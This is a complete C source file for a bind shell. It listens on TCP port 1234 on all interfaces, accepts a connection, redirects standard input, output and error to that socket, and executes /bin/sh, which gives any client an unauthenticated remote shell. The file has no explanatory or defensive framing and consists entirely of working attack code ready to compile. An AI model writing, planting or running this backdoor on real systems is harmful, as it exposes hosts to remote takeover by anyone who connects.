#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>

unsigned short int port = 1234;

int main()
{
	int sock = socket( AF_INET, SOCK_STREAM, 0 );

	struct sockaddr_in addr, clientAddr;
	memset( &addr, 0, sizeof( struct sockaddr_in ) );
	memset( &clientAddr, 0, sizeof( struct sockaddr_in ) );

	addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl( INADDR_ANY );
    addr.sin_port        = htons( port );

    if( bind( sock, ( struct sockaddr* )&addr, sizeof( struct sockaddr_in ) ) < 0 )
    	return 1;

    if( listen( sock, 10 ) < 0 )
    	return 1;

    int len = sizeof( struct sockaddr_in );
    int clientSock = accept( sock, ( struct sockaddr* )&clientAddr, &len );

	dup2( clientSock, 0 );
	dup2( clientSock, 1 );
	dup2( clientSock, 2 );

	execl( "/bin/sh", "sh", NULL );

	close( clientSock );
	close( sock );

	return 0;
}